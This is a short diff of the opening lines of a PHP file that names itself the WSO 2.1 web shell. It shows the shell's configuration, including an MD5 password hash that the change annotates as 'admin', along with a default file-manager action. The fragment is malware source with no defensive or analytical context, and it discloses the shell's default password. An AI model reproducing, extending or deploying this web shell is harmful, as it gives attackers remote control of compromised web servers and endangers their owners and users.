@@ -1,6 +1,6 @@
 <?php
 /* WSO 2.1 (Web Shell by oRb) */
-$auth_pass = "21232f297a57a5a743894a0e4a801fc3";
+$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#df5";
 $default_action = 'FilesMan';
 @define('SELF_PATH', __FILE__);
